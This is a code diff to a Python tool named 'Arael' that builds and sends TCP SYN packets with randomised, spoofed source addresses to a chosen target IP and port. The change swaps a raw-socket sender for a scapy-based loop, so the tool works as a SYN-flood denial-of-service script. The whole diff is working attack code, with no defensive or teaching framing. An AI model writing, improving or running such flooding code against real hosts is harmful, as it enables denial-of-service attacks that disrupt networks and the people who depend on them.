@@ -5,7 +5,7 @@ from random import randint
 import struct
 import array
 import socket
-from scapy.all import send
+from scapy.all import IP, TCP, send
 
 # Calculate Checksum for TCP Packet
 
@@ -106,30 +106,27 @@ def args():
    
     return args 
 
-def display_interface(src_ip, src_p, trg_ip, trg_p):
+def display_interface(trg_ip, trg_p):
     # Hardcoded ASCII art interface
     interface = f"""
     +----------------------------+
                 Arael
     +----------------------------+
-    | Src IP:   = {src_ip} 
-    | Src Port: = {src_p}  
-    +----------------------------+
-    | Src IP:   = {trg_ip} 
+    | Trg IP:   = {trg_ip} 
     | Trg Port: = {trg_p}  
     +----------------------------+
     """
     print(interface)
 
 
-def main():
+def legacy_send():
     try:
             
             parsed_args = args()
             for x in range (parsed_args.count):
                ip = rand_ip()
                port = rand_port()
-               display_interface(ip,port,parsed_args.target, parsed_args.port)
+               display_interface(parsed_args.target, parsed_args.port)
                pak = build(
                 ip,
                 port,
@@ -140,7 +137,7 @@ def main():
                )
                print(pak)
                sok = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-               sok.sendto(pak,(parsed_args.target,0))
+               sok.sendto(pak,(parsed_args.target,0)) 
                x=x+1
 
             
@@ -149,9 +146,34 @@ def main():
             print(e)        
 
 
+def send_tcp():
+    total = 0
+    parsed_args = args() 
+    print("IPv4 Packets are sending ...")
+    display_interface(parsed_args.target, parsed_args.port)
+
+    for total in range(0, parsed_args.count):
+        s_port = rand_port()
+        s_eq = rand_port()
+        w_indow = rand_port()
+
+        IP_Packet = IP()
+        IP_Packet.src = rand_ip()
+        IP_Packet.dst = parsed_args.target
+
+        TCP_Packet = TCP()
+        TCP_Packet.sport = s_port
+        TCP_Packet.dport = parsed_args.port
+        TCP_Packet.flags = "S"
+        TCP_Packet.seq = s_eq
+        TCP_Packet.window = w_indow
+
+        send(IP_Packet / TCP_Packet, verbose=0)
+        total += 1
+        print('.', end='', flush=True)
 
 
 
 if __name__ == "__main__":
-    main()
-
+ send_tcp() 
+	
